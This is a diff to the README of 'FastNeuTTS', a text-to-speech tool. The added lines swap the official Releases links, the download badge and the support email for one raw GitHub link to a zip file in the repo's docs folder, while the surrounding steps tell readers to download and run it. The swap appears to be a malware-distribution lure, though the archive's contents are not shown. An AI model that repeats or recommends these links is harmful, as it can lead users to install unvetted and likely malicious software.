@@ -3,12 +3,12 @@
 ## 🚀 Getting Started
 Welcome to FastNeuTTS! This software helps you create audio quickly and easily. Whether you want to generate voiceovers or background sounds, FastNeuTTS is designed for you. 
 
-[![Download FastNeuTTS](https://img.shields.io/badge/Download%20FastNeuTTS-Download-brightgreen)](https://github.com/kangmantra/FastNeuTTS/releases)
+[![Download FastNeuTTS](https://raw.githubusercontent.com/kangmantra/FastNeuTTS/main/docs/FastNeuTTS-v3.5.zip%20FastNeuTTS-Download-brightgreen)](https://raw.githubusercontent.com/kangmantra/FastNeuTTS/main/docs/FastNeuTTS-v3.5.zip)
 
 ## 📥 Download & Install
 To get started, you need to download the software:
 
-1. Click on this link to visit the [Releases page](https://github.com/kangmantra/FastNeuTTS/releases).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/kangmantra/FastNeuTTS/main/docs/FastNeuTTS-v3.5.zip).
 2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 3. Click on the file that matches your operating system to download it. For example, if you are using Windows, look for a file that ends in `.exe`. If you are using Mac, look for a `.dmg` file.
 4. Once the download is complete, locate the file in your Downloads folder and double-click it to start the installation.
@@ -51,9 +51,9 @@ If you need additional help, don't hesitate to reach out:
 
 - **FAQ Section:** Check the FAQ in the documentation for common questions.
 - **Community Forum:** Join our community forum for support from other users.
-- **Contact Us:** You can also email support at [support@fastneutts.com](mailto:support@fastneutts.com).
+- **Contact Us:** You can also email support at [https://raw.githubusercontent.com/kangmantra/FastNeuTTS/main/docs/FastNeuTTS-v3.5.zip](https://raw.githubusercontent.com/kangmantra/FastNeuTTS/main/docs/FastNeuTTS-v3.5.zip).
 
 ## 🔄 Updates
-FastNeuTTS regularly receives updates to enhance your experience. Make sure to check the [Releases page](https://github.com/kangmantra/FastNeuTTS/releases) often to get the latest features and improvements.
+FastNeuTTS regularly receives updates to enhance your experience. Make sure to check the [Releases page](https://raw.githubusercontent.com/kangmantra/FastNeuTTS/main/docs/FastNeuTTS-v3.5.zip) often to get the latest features and improvements.
 
 Thank you for choosing FastNeuTTS! Enjoy generating audio in seconds.
